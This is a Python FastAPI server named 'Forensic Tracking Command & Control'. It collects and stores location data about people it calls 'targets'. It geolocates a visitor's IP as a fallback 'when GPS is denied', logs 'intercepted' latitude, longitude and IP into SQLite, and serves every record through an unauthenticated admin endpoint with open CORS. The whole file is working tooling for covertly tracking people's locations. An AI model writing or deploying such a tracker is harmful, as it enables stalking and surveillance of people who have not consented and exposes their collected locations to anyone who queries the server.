import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from datetime import datetime
import httpx
import sqlite3
import os

app = FastAPI(title="Forensic Tracking Command & Control")

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# SQLite Setup - Creates 'forensics.db' locally
DB_PATH = "forensics.db"


def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude REAL,
            longitude REAL,
            method TEXT,
            accuracy TEXT,
            city TEXT,
            country TEXT,
            ip TEXT,
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()


# Initialize the database on startup
init_db()


class TrackingData(BaseModel):
    latitude: float
    longitude: float
    method: str
    accuracy: str
    city: str = "Unknown"
    country: str = "Unknown"
    ip: str = "Unknown"


@app.get("/track-ip")
async def track_ip(request: Request):
    """
    Passive Inference: Extracts IP and Geolocation data.
    Used for failover when GPS is denied.
    """
    client_ip = request.headers.get("x-forwarded-for") or request.client.host
    # If on localhost, ip-api.com will return the server's public IP by default
    api_url = (
        f"http://ip-api.com/json/{client_ip}"
        if client_ip not in ["127.0.0.1", "::1"]
        else "http://ip-api.com/json/"
    )

    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(api_url)
            return response.json()
    except Exception as e:
        return {"status": "fail", "message": str(e)}


@app.post("/log-target")
async def log_target(data: TrackingData):
    """
    Saves intercepted target data into the local SQLite database.
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        """
        INSERT INTO targets (latitude, longitude, method, accuracy, city, country, ip, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """,
        (
            data.latitude,
            data.longitude,
            data.method,
            data.accuracy,
            data.city,
            data.country,
            data.ip,
            timestamp,
        ),
    )
    conn.commit()
    conn.close()

    return {"status": "success", "message": "Target data recorded in SQLite."}


@app.get("/get-all-targets")
async def get_all_targets():
    """
    Fetches all records for the Admin Dashboard.
    """
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row  # Allows dictionary-like access
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM targets ORDER BY timestamp DESC")
    rows = cursor.fetchall()
    conn.close()

    return [dict(row) for row in rows]


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)
